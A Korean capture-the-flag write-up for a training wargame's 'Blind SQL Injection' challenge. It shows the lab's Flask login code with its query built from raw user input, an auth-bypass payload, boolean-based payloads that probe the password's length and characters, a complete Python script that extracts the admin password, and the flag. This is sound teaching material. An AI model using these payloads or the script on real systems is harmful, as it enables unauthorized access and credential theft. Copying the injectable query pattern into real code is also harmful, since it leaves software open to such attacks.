---
title: "[Writeup] Knockon Bootcamp - 2. Blind SQL Injection"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - Blind SQL Injection
  - Boolean based
last_modified_at: 2024-08-26T18:30:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10003/>

![2. Blind SQL Injection 1](/assets/images/writeup/web-hacking/knock-on/2_Blind_SQL_Injection_1.png)

![2. Blind SQL Injection 2](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_2.png)

![2. Blind SQL Injection 3](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_3.png)

|

### 목표

---
admin 계정의 password 알아내기

|

|

### 공격 기법

---

Blind SQL Injection

- Boolean based

|

|

|

## 문제 코드

```python
from flask import Flask, request, render_template, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import text
import os

app = Flask(__name__)

MYSQL_DATABASE = os.getenv('MYSQL_DATABASE')
MYSQL_USER = os.getenv('MYSQL_USER')
MYSQL_PASSWORD = os.getenv('MYSQL_PASSWORD')
MYSQL_HOST = 'db'

app.config['SQLALCHEMY_DATABASE_URI'] = f'mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    query = None
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        query = text(f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'")
        with db.engine.connect() as connection:
            result = connection.execute(query)
            user = result.fetchone()
        if user :
            return render_template('success.html')
        else:
            error = 'Invalid Credentials'
            
    return render_template('login.html', error=error, query=query)

if __name__ == '__main__':
    db.create_all()
    app.run(debug=True, host='0.0.0.0', port=10003)

```

|

|

|

## 분석

### 메인 화면

---

![2. Blind SQL Injection 4](/assets/images/writeup/web-hacking/knock-on/2_Blind_SQL_Injection_2.png)

admin입력 후 로그인 시 화면에 쿼리가 출력됨

|

![2. Blind SQL Injection 5](/assets/images/writeup/web-hacking/knock-on/2_Blind_SQL_Injection_3.png)

username에 `‘` 입력 시 에러 화면이 뜸. SQL Injection이 가능함을 확인

|

```sql
admin' -- 1
```

![2. Blind SQL Injection 6](/assets/images/writeup/web-hacking/knock-on/2_Blind_SQL_Injection_4.png)

admin 계정으로 로그인 됨. 하지만 화면에 쿼리 결과는 출력되지 않음

화면을 통해 알 수 있는 내용이 없음.

|

|

|

## 코드 분석

### login()

---

```python
if user :
	return render_template('success.html')
else:
	error = 'Invalid Credentials'
```

`user`가 존재하면(쿼리 실행 성공 시) `success.html`로 리다이렉트

화면에 `username`이나 `flag`를 출력하는 내용은 없음

Boolean based Blind SQL Injection을 사용하여 참, 거짓 여부로 비밀번호를 알아내야 함

|

|

|

## Exploit

### 1. 비밀번호 길이 알아내기

---

`LENTH()` 함수를 사용해야함

**`LENTH()`**

```sql
LENGTH(문자열)
```

```sql
LENGTH(password)
```

password의 길이 추출

|

```sql
admin' and length(password) = 비밀번호길이 -- 1
```

```sql
admin' and length(password) = 7 -- 1
```

비밀번호 길이를 `1`부터 늘려가며 `admin`계정의 password 길이를 알 수 있음

로그인에 성공했다면 비밀번호 길이가 일치한다는 뜻

|

![2. Blind SQL Injection 7](/assets/images/writeup/web-hacking/knock-on/2_Blind_SQL_Injection_5.png)

위 방법으로 로그인을 시도해도 에러가 발생하지 않는 이유는 조건에 맞는 쿼리 결과가 없을 뿐, 쿼리는 정상적으로 실행되기 때문임

단순히 로그인을 실패한 것처럼 보이게 됨

|

|

### 2. 비밀번호 문자 알아내기

---

비밀번호 길이를 알아냈다면 비밀번호가 뭔지 알아내야 함

|

`SUBSTR()`과 `ASCII()`함수 사용

**`SUBSTR()`**

```sql
SUBSTRING(문자열, 시작위치, 반환_문자열_길이)
```

```sql
SUBSTRING(password, 1, 1)
```

password 필드의 첫 번째 문자 추출

|

**`ASCII()`**

```sql
ASCII(문자열)
```

```sql
ASCII(SUBSTRING(password, 1, 1))
```

password 필드의 첫 번째 문자 추출 후 해당 문자의 ASCII 값 반환

|

|

[ASCII 코드표](https://i.namu.wiki/i/J5OY6lUdgjHTlVLVE1yuSUSVEY_khEqx1Wv-Bk_DZNybw4Er8uv7NkzL_8my5Jq0fR4X9LBEPRyLCcObaxweHBykrkVGOisg0AGPZWQI06slFZjN5jo7IC6mCka7jFePriWFlpYOdNIml2Vt6RLmpw.gif)를 확인해보면 0~31의 제어문자를 제외한 32~126까지가 비밀번호에 사용될 수 있는 문자임을 알 수 있음

```sql
admin' and ascii(SUBSTRING(password,비밀번호위치,1)) = 아스키코드 -- 1
```

```sql
admin' and ascii(SUBSTRING(password,1,1)) = 32 -- 1
```

```sql
admin' and ascii(SUBSTRING(password,10,1)) = 126 -- 1
```

`password`의 자릿수를 바꿔가며, 각 자리마다 아스키코드 32부터 126까지 직접 값을 바꿔가며 비밀번호를 알아낼 수 있음. 

로그인에 성공했다면 해당 자리의 비밀번호가 일치한다는 뜻

추가로, MySQL을 사용하기 때문에 `ascii`대신 `ORD`를 사용해도 됨.

`ascii()`: MySQL, SQL Server, PostgreSQL 등 다양한 DB에서 지원

`ORD()`: MySQL에서 지원

하지만 이렇게 수작업으로 알아내기엔 시간이 너무 오래 걸림. Python을 이용해 비밀번호를 알아내는 자동화 코드를 작성해야 함

|

|

### 자동화 코드: find_password_length()

---

1. HTTP 요청을 보내기 위해 `requests` 라이브러리 사용

    ```bash
    pip install requests
    ```

    ```python
    import requests
    ```

    |

2. 공격 대상 설정

    SQL Injection에 취약한 `username`과 `password`필드가 있는 URL 설정

    ```python
    url = "http://war.knock-on.org:10003/login"
    ```

    |

3. username, password 설정

    ```python
    username = "admin"
    password = "1"
    ```

    |

4. 비밀번호 길이 알아내는 루프

    ```python
    for length in range(0, 51): # 0부터 50까지
        payload= {"username": f"{username}' AND LENGTH(password) = {length} -- 1", "password": f"{password}"}
        res = request.post(url, data=payload)
    ```

    |

5. 성공 메시지 확인

    로그인 성공 시 `Hello`라는 메시지가 출력되었음을 확인함

    ```python
    if "Hello" in res.text:
        return length
    ```

    |

6. 결과 확인

    ```python
    print(find_password_length(url, username, password))
    ```

    |

7. 완성된 find_password_length()

    ```python
    import requests

    def find_password_length(url, username, password):
        for length in range(0, 51): # 0부터 50까지
            payload= {"username": f"{username}' AND LENGTH(password) = {length} -- 1", "password": f"{password}"}
            res = requests.post(url, data=payload)
            if "Hello" in res.text:
                return length

    url = "http://war.knock-on.org:10003/login"
    username = "admin"
    password = "1"
    password_length = find_password_length(url, username, password)

    print(f"비밀번호 길이: {password_length}")
    ```

|

|

### 자동화 코드: find_password()

---

1. 찾아낸 password를 저장할 stirng 변수 초기화

    ```python
    string= ""
    ```

    |

2. 비밀번호 찾기 루프

    ```python
    for length in range(1, password_length+1): # 비밀번호 위치 (1부터 password_length까지)
        print(f"{length}번째 문자 탐색 중...")
        for ascii_code in range(32, 127): # 아스키 코드 32부터 126까지
            payload = {"username":f"{username}' AND ASCII(SUBSTRING(password, {length}, 1)) = {ascii_code} -- 1", "password":f"{password}"}
            res = requests.post(url, data=payload)
            if "Hello" in res.text:
                string+= chr(ascii_code) # ascii 값을 문자로 변환
                print(f"현재까지 알아낸 비밀번호: {string}")
                # return string 여기서 반환하면 안됨
                break
    return string # 완성된 string 반환
    ```

    |

3. 결과 확인

    ```python
    print(find_password(url, password_length, username, password))
    ```

    |

4. 완성된 find_password()

    ```python
    def find_password(url, password_length, username, password):
        string = ""
        for length in range(1, password_length+1): # 비밀번호 위치 (1부터 password_length까지)
            print(f"{length}번째 문자 탐색 중...")
            for ascii_code in range(32, 127): # 아스키 코드 32부터 126까지
                payload = {"username":f"{username}' AND ASCII(SUBSTRING(password, {length}, 1)) = {ascii_code} -- 1", "password":f"{password}"}
                res = requests.post(url, data=payload)
                if "Hello" in res.text:
                    string+= chr(ascii_code) # ascii 값을 문자로 변환
                    print(f"현재까지 알아낸 비밀번호: {string}")
                    # return string 여기서 반환하면 안됨
                    break
        return string # 완성된 string 반환
            
    print(find_password(url, password_length, username, password))
    ```

|

|

|

## Payload

```python
import requests

# 비밀번호 길이 찾기
def find_password_length(url, username, password):
	for length in range(0, 51): # 0부터 50까지
		payload= {"username": f"{username}' AND LENGTH(password) = {length} -- 1", "password": f"{password}"}
		res = requests.post(url, data=payload)
		if "Hello" in res.text:
			return length

# 비밀번호 찾기
def find_password(url, password_length, username, password):
    string = ""
    for length in range(1, password_length+1): # 비밀번호 위치 (1부터 password_length까지)
        print(f"{length}번째 문자 탐색 중...")
        for ascii_code in range(32, 127): # 아스키 코드 32부터 126까지
            payload = {"username":f"{username}' AND ASCII(SUBSTRING(password, {length}, 1)) = {ascii_code} -- 1", "password":f"{password}"}
            res = requests.post(url, data=payload)
            if "Hello" in res.text:
                string+= chr(ascii_code) # ascii 값을 문자로 변환
                print(f"현재까지 알아낸 비밀번호: {string}")
                # return string 여기서 반환하면 안됨
                break
    return string # 완성된 string 반환

url = "http://war.knock-on.org:10003/login"
username = "admin"
password = "1"

password_length = find_password_length(url, username, password)
print(f"비밀번호 길이: {password_length}")

password_string = find_password(url, password_length, username, password)
print(f"완성된 비밀번호: {password_string}")
```

|

|

### FLAG

```
K0{fun_sqli}
```

|

---